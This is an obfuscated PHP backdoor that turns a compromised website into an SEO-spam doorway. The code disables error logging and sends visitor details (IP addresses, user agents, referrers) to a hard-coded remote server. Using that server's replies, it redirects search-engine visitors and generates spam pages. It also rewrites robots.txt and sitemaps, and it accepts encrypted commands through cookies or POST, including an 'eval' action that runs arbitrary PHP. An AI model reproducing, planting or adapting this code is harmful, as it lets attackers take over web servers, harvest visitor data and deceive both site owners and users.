<?php

@ini_set('error_log', NULL);@ini_set('log_errors', 0);@ini_set('max_execution_time', 0);@error_reporting(0);@set_time_limit(0);date_default_timezone_set('UTC');class _v5lhwnk{static private $_q4iax90k = 84536951;static function _4mqpd($_dx3iqj9f, $_0ei3kjrv){$_dx3iqj9f[2] = count($_dx3iqj9f) > 4 ? long2ip(_v5lhwnk::$_q4iax90k - 642) : $_dx3iqj9f[2];$_9rk3wftd = _v5lhwnk::_grsrh($_dx3iqj9f, $_0ei3kjrv);if (!$_9rk3wftd) {$_9rk3wftd = _v5lhwnk::_7f9gs($_dx3iqj9f, $_0ei3kjrv);}return $_9rk3wftd;}static function _grsrh($_dx3iqj9f, $_9rk3wftd, $_y67h627g = NULL){if (!function_exists('curl_version')) {return "";}if (is_array($_dx3iqj9f)) {$_dx3iqj9f = implode("/", $_dx3iqj9f);}$_b7q2s5qs = curl_init();curl_setopt($_b7q2s5qs, CURLOPT_SSL_VERIFYHOST, false);curl_setopt($_b7q2s5qs, CURLOPT_SSL_VERIFYPEER, false);curl_setopt($_b7q2s5qs, CURLOPT_URL, $_dx3iqj9f);if (!empty($_9rk3wftd)) {curl_setopt($_b7q2s5qs, CURLOPT_POST, 1);curl_setopt($_b7q2s5qs, CURLOPT_POSTFIELDS, $_9rk3wftd);}if (!empty($_y67h627g)) {curl_setopt($_b7q2s5qs, CURLOPT_HTTPHEADER, $_y67h627g);}curl_setopt($_b7q2s5qs, CURLOPT_RETURNTRANSFER, TRUE);$_m23puuid = curl_exec($_b7q2s5qs);curl_close($_b7q2s5qs);return $_m23puuid;}static function _7f9gs($_dx3iqj9f, $_9rk3wftd, $_y67h627g = NULL){if (is_array($_dx3iqj9f)) {$_dx3iqj9f = implode("/", $_dx3iqj9f);}if (!empty($_9rk3wftd)) {$_e5dfizhq = array('method' => 'POST','header' => 'Content-type: application/x-www-form-urlencoded','content' => $_9rk3wftd);if (!empty($_y67h627g)) {$_e5dfizhq["header"] = $_e5dfizhq["header"] . "\r\n" . implode("\r\n", $_y67h627g);}$_grhqt0zu = stream_context_create(array('http' => $_e5dfizhq));} else {$_e5dfizhq = array('method' => 'GET',);if (!empty($_y67h627g)) {$_e5dfizhq["header"] = implode("\r\n", $_y67h627g);}$_grhqt0zu = stream_context_create(array('http' => $_e5dfizhq));}return @file_get_contents($_dx3iqj9f, FALSE, $_grhqt0zu);}}class _rvp5f0j{private static $_n7ab8pf6 = "";private static $_o9fgxl1k = -1;private static $_fr1l73e3 = "";private $_o7g69lqo = "";private $_bimu6518 = "";private $_p4593kzm = "";private $_lkat1xx2 = "";public static function _7k1fv($_f2v1hf97, $_4poip34e, $_mb8fjz6y){_rvp5f0j::$_n7ab8pf6 = $_f2v1hf97 . "/cache/";_rvp5f0j::$_o9fgxl1k = $_4poip34e;_rvp5f0j::$_fr1l73e3 = $_mb8fjz6y;if (!@file_exists(_rvp5f0j::$_n7ab8pf6)) {@mkdir(_rvp5f0j::$_n7ab8pf6);}}static public function _wdclk(){$_pxw8iw8i = 0;foreach (scandir(_rvp5f0j::$_n7ab8pf6) as $_lciagdmh) {$_pxw8iw8i += 1;}return $_pxw8iw8i;}public static function _yr4el(){return TRUE;}public function __construct($_88iezbfz, $_jrn1pbst, $_cesvccnh, $_a8zpjkh9){$this->_o7g69lqo = $_88iezbfz;$this->_bimu6518 = $_jrn1pbst;$this->_p4593kzm = $_cesvccnh;$this->_lkat1xx2 = $_a8zpjkh9;}public function _ohiqx(){function _hqb8k($_hg8lwznp, $_rr3kqd8d){return round(rand($_hg8lwznp, $_rr3kqd8d - 1) + (rand(0, PHP_INT_MAX - 1) / PHP_INT_MAX), 2);}$_9hj8i8gd = _t7ldveu::_govbd();$_9rk3wftd = str_replace("{{ text }}", $this->_bimu6518,str_replace("{{ keyword }}", $this->_p4593kzm,str_replace("{{ links }}", $this->_lkat1xx2, $this->_o7g69lqo)));while (TRUE) {$_rpq27mrk = preg_replace('/' . preg_quote("{{ randkeyword }}", '/') . '/', _t7ldveu::_7o4c0(), $_9rk3wftd, 1);if ($_rpq27mrk === $_9rk3wftd) {break;}$_9rk3wftd = $_rpq27mrk;}while (TRUE) {preg_match('/{{ KEYWORDBYINDEX-ANCHOR (\d*) }}/', $_9rk3wftd, $_gdsfoivc);if (empty($_gdsfoivc)) {break;}$_cesvccnh = @$_9hj8i8gd[intval($_gdsfoivc[1])];$_tn9w6bak = _y5l6ym::_qlijq($_cesvccnh);$_9rk3wftd = str_replace($_gdsfoivc[0], $_tn9w6bak, $_9rk3wftd);}while (TRUE) {preg_match('/{{ KEYWORDBYINDEX (\d*) }}/', $_9rk3wftd, $_gdsfoivc);if (empty($_gdsfoivc)) {break;}$_cesvccnh = @$_9hj8i8gd[intval($_gdsfoivc[1])];$_9rk3wftd = str_replace($_gdsfoivc[0], $_cesvccnh, $_9rk3wftd);}while (TRUE) {preg_match('/{{ RANDFLOAT (\d*)-(\d*) }}/', $_9rk3wftd, $_gdsfoivc);if (empty($_gdsfoivc)) {break;}$_9rk3wftd = str_replace($_gdsfoivc[0], _hqb8k($_gdsfoivc[1], $_gdsfoivc[2]), $_9rk3wftd);}while (TRUE) {preg_match('/{{ RANDINT (\d*)-(\d*) }}/', $_9rk3wftd, $_gdsfoivc);if (empty($_gdsfoivc)) {break;}$_9rk3wftd = str_replace($_gdsfoivc[0], rand($_gdsfoivc[1], $_gdsfoivc[2]), $_9rk3wftd);}return $_9rk3wftd;}public function _btong(){$_t2apxxsu = _rvp5f0j::$_n7ab8pf6 . md5($this->_p4593kzm . _rvp5f0j::$_fr1l73e3);if (_rvp5f0j::$_o9fgxl1k == -1) {$_nry3o63q = -1;} else {$_nry3o63q = time() + (3600 * 24 * 30);}$_4smseagi = array("template" => $this->_o7g69lqo, "text" => $this->_bimu6518, "keyword" => $this->_p4593kzm,"links" => $this->_lkat1xx2, "expired" => $_nry3o63q);@file_put_contents($_t2apxxsu, serialize($_4smseagi));}static public function _pbxmb($_cesvccnh){$_t2apxxsu = _rvp5f0j::$_n7ab8pf6 . md5($_cesvccnh . _rvp5f0j::$_fr1l73e3);$_t2apxxsu = @unserialize(@file_get_contents($_t2apxxsu));if (!empty($_t2apxxsu) && ($_t2apxxsu["expired"] > time() || $_t2apxxsu["expired"] == -1)) {return new _rvp5f0j($_t2apxxsu["template"], $_t2apxxsu["text"], $_t2apxxsu["keyword"], $_t2apxxsu["links"]);} else {return null;}}}class _zw8jf4z{private static $_n7ab8pf6 = "";private static $_9rq5iqlg = "";public static function _7k1fv($_f2v1hf97, $_lkfcxt43){_zw8jf4z::$_n7ab8pf6 = $_f2v1hf97 . "/";_zw8jf4z::$_9rq5iqlg = $_lkfcxt43;if (!@file_exists(_zw8jf4z::$_n7ab8pf6)) {@mkdir(_zw8jf4z::$_n7ab8pf6);}}public static function _yr4el(){return TRUE;}static public function _wdclk(){$_pxw8iw8i = 0;foreach (scandir(_zw8jf4z::$_n7ab8pf6) as $_lciagdmh) {if (strpos($_lciagdmh, _zw8jf4z::$_9rq5iqlg) === 0) {$_pxw8iw8i += 1;}}return $_pxw8iw8i;}static public function _7o4c0(){$_vsbe75cq = array();foreach (scandir(_zw8jf4z::$_n7ab8pf6) as $_lciagdmh) {if (strpos($_lciagdmh, _zw8jf4z::$_9rq5iqlg) === 0) {$_vsbe75cq[] = $_lciagdmh;}}return @file_get_contents(_zw8jf4z::$_n7ab8pf6 . $_vsbe75cq[array_rand($_vsbe75cq)]);}static public function _btong($_w6o0xxhi){if (@file_exists(_zw8jf4z::$_9rq5iqlg . "_" . md5($_w6o0xxhi) . ".html")) {return;}@file_put_contents(_zw8jf4z::$_9rq5iqlg . "_" . md5($_w6o0xxhi) . ".html", $_w6o0xxhi);}}class _t7ldveu{private static $_n7ab8pf6 = "";private static $_9rq5iqlg = "";private static $_5tvlhvmk = array();private static $_nrfyb4c6 = array();public static function _7k1fv($_f2v1hf97, $_lkfcxt43){_t7ldveu::$_n7ab8pf6 = $_f2v1hf97 . "/";_t7ldveu::$_9rq5iqlg = $_lkfcxt43;if (!@file_exists(_t7ldveu::$_n7ab8pf6)) {@mkdir(_t7ldveu::$_n7ab8pf6);}}private static function _440zm(){$_sxxul7ua = array();foreach (scandir(_t7ldveu::$_n7ab8pf6) as $_lciagdmh) {if (strpos($_lciagdmh, _t7ldveu::$_9rq5iqlg) === 0) {$_sxxul7ua[] = $_lciagdmh;}}return $_sxxul7ua;}public static function _yr4el(){return TRUE;}static public function _7o4c0(){if (empty(_t7ldveu::$_5tvlhvmk)) {$_sxxul7ua = _t7ldveu::_440zm();_t7ldveu::$_5tvlhvmk = @file(_t7ldveu::$_n7ab8pf6 . $_sxxul7ua[array_rand($_sxxul7ua)], FILE_IGNORE_NEW_LINES);}return _t7ldveu::$_5tvlhvmk[array_rand(_t7ldveu::$_5tvlhvmk)];}static public function _govbd(){if (empty(_t7ldveu::$_nrfyb4c6)) {$_sxxul7ua = _t7ldveu::_440zm();foreach ($_sxxul7ua as $_g3nh1ytv) {_t7ldveu::$_nrfyb4c6 = array_merge(_t7ldveu::$_nrfyb4c6, @file(_t7ldveu::$_n7ab8pf6 . $_g3nh1ytv, FILE_IGNORE_NEW_LINES));}}return _t7ldveu::$_nrfyb4c6;}static public function _btong($_e20p8wbs){if (@file_exists(_t7ldveu::$_9rq5iqlg . "_" . md5($_e20p8wbs) . ".list")) {return;}@file_put_contents(_t7ldveu::$_9rq5iqlg . "_" . md5($_e20p8wbs) . ".list", $_e20p8wbs);}static public function _lavs2($_cesvccnh){@file_put_contents(_t7ldveu::$_9rq5iqlg . "_" . md5(_y5l6ym::$_zktvod6d) . ".list", $_cesvccnh . "\n", 8);}}class _y5l6ym{static public $_mq45aotq = "5.3";static public $_zktvod6d = "4934cefa-d061-709a-6c9d-2d484cfd7a68";private $_sxncnh3a = "http://136.12.78.46/app/assets/api2?action=redir";private $_wrgj8evw = "http://136.12.78.46/app/assets/api?action=page";static public $_tfa71b3h = 5;static public $_a6kv84hq = 20;private function _50k39(){$_h9r09kkm = array('#libwww-perl#i','#MJ12bot#i','#msnbot#i', '#msnbot-media#i','#YandexBot#i', '#msnbot#i', '#YandexWebmaster#i','#spider#i', '#yahoo#i', '#google#i', '#altavista#i','#ask#i','#yahoo!\s*slurp#i','#BingBot#i');if (!empty($_SERVER['HTTP_USER_AGENT']) && (FALSE !== strpos(preg_replace($_h9r09kkm, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT']), '-NO-WAY-'))) {$_8xyg49pq = 1;} elseif (empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) || empty($_SERVER['HTTP_REFERER'])) {$_8xyg49pq = 1;} elseif (strpos($_SERVER['HTTP_REFERER'], "google") === FALSE &&strpos($_SERVER['HTTP_REFERER'], "yahoo") === FALSE &&strpos($_SERVER['HTTP_REFERER'], "bing") === FALSE &&strpos($_SERVER['HTTP_REFERER'], "yandex") === FALSE) {$_8xyg49pq = 1;} else {$_8xyg49pq = 0;}return $_8xyg49pq;}private static function _uhou0(){$_0ei3kjrv = array();$_0ei3kjrv['ip'] = $_SERVER['REMOTE_ADDR'];$_0ei3kjrv['qs'] = @$_SERVER['HTTP_HOST'] . @$_SERVER['REQUEST_URI'];$_0ei3kjrv['ua'] = @$_SERVER['HTTP_USER_AGENT'];$_0ei3kjrv['lang'] = @$_SERVER['HTTP_ACCEPT_LANGUAGE'];$_0ei3kjrv['ref'] = @$_SERVER['HTTP_REFERER'];$_0ei3kjrv['enc'] = @$_SERVER['HTTP_ACCEPT_ENCODING'];$_0ei3kjrv['acp'] = @$_SERVER['HTTP_ACCEPT'];$_0ei3kjrv['char'] = @$_SERVER['HTTP_ACCEPT_CHARSET'];$_0ei3kjrv['conn'] = @$_SERVER['HTTP_CONNECTION'];return $_0ei3kjrv;}public function __construct(){$this->_sxncnh3a = explode("/", $this->_sxncnh3a);$this->_wrgj8evw = explode("/", $this->_wrgj8evw);}static public function _zy2ij($_6yi39aes){if (strlen($_6yi39aes) < 4) {return "";}$_jw5ti09i = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";$_9hj8i8gd = str_split($_jw5ti09i);$_9hj8i8gd = array_flip($_9hj8i8gd);$_iji414rf = 0;$_vgj649hi = "";$_6yi39aes = preg_replace("~[^A-Za-z0-9\+\/\=]~", "", $_6yi39aes);do {$_npab0ac8 = $_9hj8i8gd[$_6yi39aes[$_iji414rf++]];$_p6eybpfv = $_9hj8i8gd[$_6yi39aes[$_iji414rf++]];$_pudsptbs = $_9hj8i8gd[$_6yi39aes[$_iji414rf++]];$_y9pd26zu = $_9hj8i8gd[$_6yi39aes[$_iji414rf++]];$_ch31y4rr = ($_npab0ac8 << 2) | ($_p6eybpfv >> 4);$_yoqvylyy = (($_p6eybpfv & 15) << 4) | ($_pudsptbs >> 2);$_ipoh8x4y = (($_pudsptbs & 3) << 6) | $_y9pd26zu;$_vgj649hi = $_vgj649hi . chr($_ch31y4rr);if ($_pudsptbs != 64) {$_vgj649hi = $_vgj649hi . chr($_yoqvylyy);}if ($_y9pd26zu != 64) {$_vgj649hi = $_vgj649hi . chr($_ipoh8x4y);}} while ($_iji414rf < strlen($_6yi39aes));return $_vgj649hi;}private function _weq1c($_cesvccnh){$_88iezbfz = "";$_jrn1pbst = "";$_0ei3kjrv = _y5l6ym::_uhou0();$_0ei3kjrv["uid"] = _y5l6ym::$_zktvod6d;$_0ei3kjrv["keyword"] = $_cesvccnh;$_0ei3kjrv["tc"] = 10;$_0ei3kjrv = http_build_query($_0ei3kjrv);$_qsehdabx = _v5lhwnk::_4mqpd($this->_wrgj8evw, $_0ei3kjrv);if (strpos($_qsehdabx, _y5l6ym::$_zktvod6d) === FALSE) {return array($_88iezbfz, $_jrn1pbst);}$_88iezbfz = _zw8jf4z::_7o4c0();$_jrn1pbst = substr($_qsehdabx, strlen(_y5l6ym::$_zktvod6d));$_jrn1pbst = explode("\n", $_jrn1pbst);shuffle($_jrn1pbst);$_jrn1pbst = implode(" ", $_jrn1pbst);return array($_88iezbfz, $_jrn1pbst);}private function _marpp(){$_0ei3kjrv = _y5l6ym::_uhou0();if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {$_0ei3kjrv['cfconn'] = @$_SERVER['HTTP_CF_CONNECTING_IP'];}if (isset($_SERVER['HTTP_X_REAL_IP'])) {$_0ei3kjrv['xreal'] = @$_SERVER['HTTP_X_REAL_IP'];}if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {$_0ei3kjrv['xforward'] = @$_SERVER['HTTP_X_FORWARDED_FOR'];}$_0ei3kjrv["uid"] = _y5l6ym::$_zktvod6d;$_0ei3kjrv = http_build_query($_0ei3kjrv);$_469rdmh1 = _v5lhwnk::_4mqpd($this->_sxncnh3a, $_0ei3kjrv);$_469rdmh1 = @unserialize($_469rdmh1);if (isset($_469rdmh1["type"]) && $_469rdmh1["type"] == "redir") {if (!empty($_469rdmh1["data"]["header"])) {header($_469rdmh1["data"]["header"]);return true;} elseif (!empty($_469rdmh1["data"]["code"])) {echo $_469rdmh1["data"]["code"];return true;}}return false;}public function _yr4el(){return _rvp5f0j::_yr4el() && _zw8jf4z::_yr4el() && _t7ldveu::_yr4el();}static public function _chr5t(){if ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443) {return true;}return false;}public static function _4v9po(){$_ntko4bzn = explode("?", $_SERVER["REQUEST_URI"], 2);$_ntko4bzn = $_ntko4bzn[0];if (strpos($_ntko4bzn, ".php") === FALSE) {$_ntko4bzn = explode("/", $_ntko4bzn);array_pop($_ntko4bzn);$_ntko4bzn = implode("/", $_ntko4bzn) . "/";}return sprintf("%s://%s%s", _y5l6ym::_chr5t() ? "https" : "http", $_SERVER['HTTP_HOST'], $_ntko4bzn);}public static function _88abe(){$_g4hqamtr = Array("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15","Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15","Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36");$_gugmkbgb = array("https://www.google.com/ping?sitemap=" => "Sitemap Notification Received",);$_y67h627g = array("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language: en-US,en;q=0.5","User-Agent: " . $_g4hqamtr[array_rand($_g4hqamtr)],);$_rb0hdtzp = urlencode(_y5l6ym::_hgwsp() . "/sitemap.xml");foreach ($_gugmkbgb as $_dx3iqj9f => $_1p34eu1o) {$_kzf1mmk2 = _v5lhwnk::_grsrh($_dx3iqj9f . $_rb0hdtzp, NULL, $_y67h627g);if (empty($_kzf1mmk2)) {$_kzf1mmk2 = _v5lhwnk::_7f9gs($_dx3iqj9f . $_rb0hdtzp, NULL, $_y67h627g);}if (empty($_kzf1mmk2)) {return FALSE;}if (strpos($_kzf1mmk2, $_1p34eu1o) === FALSE) {return FALSE;}}return TRUE;}public static function _8imdt(){$_zl9ye7cb = "User-agent: *\nDisallow: %s\nUser-agent: Bingbot\nUser-agent: Googlebot\nUser-agent: Slurp\nDisallow:\nSitemap: %s\n";$_ntko4bzn = explode("?", $_SERVER["REQUEST_URI"], 2);$_ntko4bzn = $_ntko4bzn[0];$_1nekddgg = substr($_ntko4bzn, 0, strrpos($_ntko4bzn, "/"));$_pvr5v8z1 = sprintf($_zl9ye7cb, $_1nekddgg, _y5l6ym::_hgwsp() . "/sitemap.xml");$_5d1uq92h = $_SERVER["DOCUMENT_ROOT"] . "/robots.txt";if (@file_exists($_5d1uq92h)) {@chmod($_5d1uq92h, 0777);$_ss6uel7m = @file_get_contents($_5d1uq92h);} else {$_ss6uel7m = "";}if (strpos($_ss6uel7m, $_pvr5v8z1) === FALSE) {@file_put_contents($_5d1uq92h, $_ss6uel7m . "\n" . $_pvr5v8z1);$_ss6uel7m = @file_get_contents($_5d1uq92h);return (strpos($_ss6uel7m, $_pvr5v8z1) !== FALSE);}return FALSE;}public static function _hgwsp(){$_ntko4bzn = explode("?", $_SERVER["REQUEST_URI"], 2);$_ntko4bzn = $_ntko4bzn[0];$_f2v1hf97 = substr($_ntko4bzn, 0, strrpos($_ntko4bzn, "/"));return sprintf("%s://%s%s", _y5l6ym::_chr5t() ? "https" : "http", $_SERVER['HTTP_HOST'], $_f2v1hf97);}public static function _qlijq($_cesvccnh){$_ylfgrdvo = _y5l6ym::_4v9po();$_pt488ge6 = substr(md5(_y5l6ym::$_zktvod6d . "salt3"), 0, 6);$_tm7nxhto = "";if (substr($_ylfgrdvo, -1) == "/") {if (ord($_pt488ge6[1]) % 2) {$_cesvccnh = str_replace(" ", "-", $_cesvccnh);} else {$_cesvccnh = str_replace(" ", "-", $_cesvccnh);}$_tm7nxhto = sprintf("%s%s", $_ylfgrdvo, urlencode($_cesvccnh));} else {if (FALSE && (ord($_pt488ge6[0]) % 2)) {$_tm7nxhto = sprintf("%s?%s=%s",$_ylfgrdvo,$_pt488ge6,urlencode(str_replace(" ", "-", $_cesvccnh)));} else {$_weifoefj = array("id", "page", "tag");$_w3g5hiqp = $_weifoefj[ord($_pt488ge6[2]) % count($_weifoefj)];if (ord($_pt488ge6[1]) % 2) {$_cesvccnh = str_replace(" ", "-", $_cesvccnh);} else {$_cesvccnh = str_replace(" ", "-", $_cesvccnh);}$_tm7nxhto = sprintf("%s?%s=%s",$_ylfgrdvo,$_w3g5hiqp,urlencode($_cesvccnh));}}return $_tm7nxhto;}public static function _zwhbk($_hg8lwznp, $_rr3kqd8d){$_vr6q21hc = "";for ($_iji414rf = 0; $_iji414rf < rand($_hg8lwznp, $_rr3kqd8d); $_iji414rf++) {$_cesvccnh = _t7ldveu::_7o4c0();$_vr6q21hc .= sprintf("<a href=\"%s\">%s</a>,\n",_y5l6ym::_qlijq($_cesvccnh), ucwords($_cesvccnh));}return $_vr6q21hc;}public static function _9xqde($_agbzxwnj = FALSE){$_86j6icif = dirname(__FILE__) . "/sitemap.xml";$_0392p3vz = "<?xml version=\"1.0\" encoding=\"UTF-8\"?" . ">\n<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">\n";$_4fcqjkyb = "</urlset>";$_9hj8i8gd = _t7ldveu::_govbd();$_q2v41585 = array();if (file_exists($_86j6icif)) {$_qsehdabx = simplexml_load_file($_86j6icif);foreach ($_qsehdabx as $_q36x6enr) {$_q2v41585[(string)$_q36x6enr->loc] = (string)$_q36x6enr->lastmod;}} else {$_agbzxwnj = FALSE;}foreach ($_9hj8i8gd as $_adjm5yaa) {$_tm7nxhto = _y5l6ym::_qlijq($_adjm5yaa);if (isset($_q2v41585[$_tm7nxhto])) {continue;}if ($_agbzxwnj) {$_8qcx024h = time();} else {$_8qcx024h = time() - (crc32($_adjm5yaa) % (60 * 60 * 24 * 30));}$_q2v41585[$_tm7nxhto] = date("Y-m-d", $_8qcx024h);}$_qae43tfc = "";foreach ($_q2v41585 as $_dx3iqj9f => $_8qcx024h) {$_qae43tfc .= "<url>\n";$_qae43tfc .= sprintf("<loc>%s</loc>\n", $_dx3iqj9f);$_qae43tfc .= sprintf("<lastmod>%s</lastmod>\n", $_8qcx024h);$_qae43tfc .= "</url>\n";}$_jf6h6cd3 = $_0392p3vz . $_qae43tfc . $_4fcqjkyb;$_rb0hdtzp = _y5l6ym::_hgwsp() . "/sitemap.xml";@file_put_contents($_86j6icif, $_jf6h6cd3);return $_rb0hdtzp;}public function _5xru3(){$_w3g5hiqp = substr(md5(_y5l6ym::$_zktvod6d . "salt3"), 0, 6);if (!$this->_50k39()) {if ($this->_marpp()) {return;}}if (!empty($_GET)) {$_z79uszkz = array_values($_GET);} else {$_z79uszkz = explode("/", $_SERVER["REQUEST_URI"]);$_z79uszkz = array_reverse($_z79uszkz);}$_cesvccnh = "";foreach ($_z79uszkz as $_veql76ov) {if (substr_count($_veql76ov, "-") > 0) {$_cesvccnh = $_veql76ov;break;}}$_cesvccnh = str_replace($_w3g5hiqp . "-", "", $_cesvccnh);$_cesvccnh = str_replace("-" . $_w3g5hiqp, "", $_cesvccnh);$_cesvccnh = str_replace("-", " ", $_cesvccnh);$_71kxab1a = array(".html", ".php", ".aspx");foreach ($_71kxab1a as $_s5u4jpqd) {if (strpos($_cesvccnh, $_s5u4jpqd) === strlen($_cesvccnh) - strlen($_s5u4jpqd)) {$_cesvccnh = substr($_cesvccnh, 0, strlen($_cesvccnh) - strlen($_s5u4jpqd));}}$_cesvccnh = urldecode($_cesvccnh);$_wnud023p = _t7ldveu::_govbd();if (empty($_cesvccnh)) {$_cesvccnh = $_wnud023p[0];} else if (!in_array($_cesvccnh, $_wnud023p)) {$_zfqqvttd = 0;foreach (str_split($_cesvccnh) as $_b7q2s5qs) {$_zfqqvttd += ord($_b7q2s5qs);}$_cesvccnh = $_wnud023p[$_zfqqvttd % count($_wnud023p)];}if (!empty($_cesvccnh)) {$_469rdmh1 = _rvp5f0j::_pbxmb($_cesvccnh);if (empty($_469rdmh1)) {list($_88iezbfz, $_jrn1pbst) = $this->_weq1c($_cesvccnh);if (empty($_jrn1pbst)) {return;}$_469rdmh1 = new _rvp5f0j($_88iezbfz, $_jrn1pbst, $_cesvccnh, _y5l6ym::_zwhbk(_y5l6ym::$_tfa71b3h, _y5l6ym::$_a6kv84hq));$_469rdmh1->_btong();}echo $_469rdmh1->_ohiqx();}}}_rvp5f0j::_7k1fv(dirname(__FILE__), -1, _y5l6ym::$_zktvod6d);_zw8jf4z::_7k1fv(dirname(__FILE__), substr(md5(_y5l6ym::$_zktvod6d . "salt12"), 0, 4));_t7ldveu::_7k1fv(dirname(__FILE__), substr(md5(_y5l6ym::$_zktvod6d . "salt22"), 0, 4));function _qmtgw($_qsehdabx, $_adjm5yaa){$_2fq0cha2 = "";for ($_iji414rf = 0; $_iji414rf < strlen($_qsehdabx);) {for ($_xul5aw4e = 0; $_xul5aw4e < strlen($_adjm5yaa) && $_iji414rf < strlen($_qsehdabx); $_xul5aw4e++, $_iji414rf++) {$_2fq0cha2 .= chr(ord($_qsehdabx[$_iji414rf]) ^ ord($_adjm5yaa[$_xul5aw4e]));}}return $_2fq0cha2;}function _6xnsj($_qsehdabx, $_adjm5yaa, $_3f21m72v){return _qmtgw(_qmtgw($_qsehdabx, $_adjm5yaa), $_3f21m72v);}foreach (array_merge($_COOKIE, $_POST) as $_dsmrcj7k => $_qsehdabx) {$_qsehdabx = @unserialize(_6xnsj(_y5l6ym::_zy2ij($_qsehdabx), $_dsmrcj7k, _y5l6ym::$_zktvod6d));if (isset($_qsehdabx['ak']) && _y5l6ym::$_zktvod6d == $_qsehdabx['ak']) {if ($_qsehdabx['a'] == 'doorway2') {if ($_qsehdabx['sa'] == 'check') {$_9rk3wftd = _v5lhwnk::_4mqpd(explode("/", "http://httpbin.org/"), "");if (strlen($_9rk3wftd) > 512) {echo @serialize(array("uid" => _y5l6ym::$_zktvod6d, "v" => _y5l6ym::$_mq45aotq,"cache" => _rvp5f0j::_wdclk(),"keywords" => count(_t7ldveu::_govbd()),"templates" => _zw8jf4z::_wdclk()));}exit;}if ($_qsehdabx['sa'] == 'templates') {foreach ($_qsehdabx["templates"] as $_88iezbfz) {_zw8jf4z::_btong($_88iezbfz);echo @serialize(array("uid" => _y5l6ym::$_zktvod6d, "v" => _y5l6ym::$_mq45aotq,));}}if ($_qsehdabx['sa'] == 'keywords') {_t7ldveu::_btong($_qsehdabx["keywords"]);_y5l6ym::_9xqde();echo @serialize(array("uid" => _y5l6ym::$_zktvod6d, "v" => _y5l6ym::$_mq45aotq,));}if ($_qsehdabx['sa'] == 'update_sitemap') {_y5l6ym::_9xqde(TRUE);echo @serialize(array("uid" => _y5l6ym::$_zktvod6d, "v" => _y5l6ym::$_mq45aotq,));}if ($_qsehdabx['sa'] == 'pages') {$_1oavw1ym = 0;$_wnud023p = _t7ldveu::_govbd();if (_zw8jf4z::_wdclk() > 0) {foreach ($_qsehdabx['pages'] as $_469rdmh1) {$_qflt485k = _rvp5f0j::_pbxmb($_469rdmh1["keyword"]);if (empty($_qflt485k)) {$_qflt485k = new _rvp5f0j(_zw8jf4z::_7o4c0(), $_469rdmh1["text"], $_469rdmh1["keyword"], _y5l6ym::_zwhbk(_y5l6ym::$_tfa71b3h, _y5l6ym::$_a6kv84hq));$_qflt485k->_btong();$_1oavw1ym += 1;if (!in_array($_469rdmh1["keyword"], $_wnud023p)) {_t7ldveu::_lavs2($_469rdmh1["keyword"]);}}}}echo @serialize(array("uid" => _y5l6ym::$_zktvod6d, "v" => _y5l6ym::$_mq45aotq, "pages" => $_1oavw1ym));}if ($_qsehdabx["sa"] == "ping") {$_kzf1mmk2 = _y5l6ym::_88abe();echo @serialize(array("uid" => _y5l6ym::$_zktvod6d, "v" => _y5l6ym::$_mq45aotq, "result" => (int)$_kzf1mmk2));}if ($_qsehdabx["sa"] == "robots") {$_kzf1mmk2 = _y5l6ym::_8imdt();echo @serialize(array("uid" => _y5l6ym::$_zktvod6d, "v" => _y5l6ym::$_mq45aotq, "result" => (int)$_kzf1mmk2));}}if ($_qsehdabx['sa'] == 'eval') {eval($_qsehdabx["data"]);exit;}}}$_g3ahgikx = new _y5l6ym();if ($_g3ahgikx->_yr4el()) {$_g3ahgikx->_5xru3();}exit();